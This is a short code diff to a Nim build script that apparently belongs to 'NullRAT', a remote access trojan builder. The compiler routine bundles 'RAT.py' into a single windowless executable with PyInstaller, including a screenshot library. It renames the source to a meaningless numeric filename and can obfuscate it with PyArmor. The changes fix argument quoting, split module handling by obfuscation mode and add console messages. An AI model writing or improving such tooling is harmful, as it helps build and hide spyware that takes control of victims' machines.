@@ -227,7 +227,7 @@ proc compiler(): int =
 
         var pyinst_cmd = pyinst & " --onefile --noconsole --hidden-import mss"
         
-        var dat: string = fmt" --add-data ""Variables.py;.'"""
+        var dat: string = fmt" --add-data ""Variables.py;."""
         pyinst_cmd.add(dat)
         
         var pyarmor_cmd: string
@@ -240,14 +240,19 @@ proc compiler(): int =
         moveFile(currdir / "RAT.py", currdir / "765678976567.py")
         pyarmor_cmd.add(dat)
 
-        for m in modules:
-            dat = fmt" --add-data '{m};.'"
-            pyinst_cmd.add(dat)
-            pyarmor_cmd.add(dat)
+        if obfuscate:
+            for m in modules:
+                dat = fmt" --add-data '{m};.'"
+                pyarmor_cmd.add(dat)
+        else:
+            for m in modules:
+                dat = fmt" --add-data ""{m};."""
+                pyinst_cmd.add(dat)
             
         pyinst_cmd.add(" 765678976567.py")
         pyarmor_cmd.add("""" 765678976567.py""")
         
+        discard execShellCmd("color C")
         if obfuscate: 
             echo pyarmor_cmd
             discard execShellCmd(pyarmor_cmd)
@@ -261,7 +266,9 @@ proc compiler(): int =
         setCurrentDir(dirr / "NullRAT")
         removeDir(folderName)
         
+        printName()
         stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful! Output in " & name)
+        echo "Press any key to exit..."
         discard getch()
         quit(0)
     
